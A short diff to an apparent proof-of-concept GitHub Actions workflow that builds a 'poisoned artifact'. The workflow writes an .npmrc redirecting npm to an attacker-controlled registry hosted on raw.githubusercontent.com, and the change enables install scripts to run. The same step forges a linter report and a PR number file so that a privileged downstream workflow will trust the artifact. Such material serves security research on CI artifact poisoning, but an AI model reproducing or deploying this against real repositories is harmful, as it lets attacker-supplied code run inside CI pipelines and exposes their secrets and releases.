@@ -11,7 +11,7 @@ jobs:
       - name: build poisoned artifact
         run: |
           mkdir -p /tmp/att
-          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-registry/main/\naudit=false\nfund=false\nprogress=false\n' > /tmp/att/.npmrc
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-registry/main/\nforeground-scripts=true\nignore-scripts=false\naudit=false\nfund=false\nprogress=false\n' > /tmp/att/.npmrc
           echo "1" > /tmp/att/pr-number.txt
           printf 'forged linter report\n' > /tmp/att/linter-report.txt
           ls -la /tmp/att
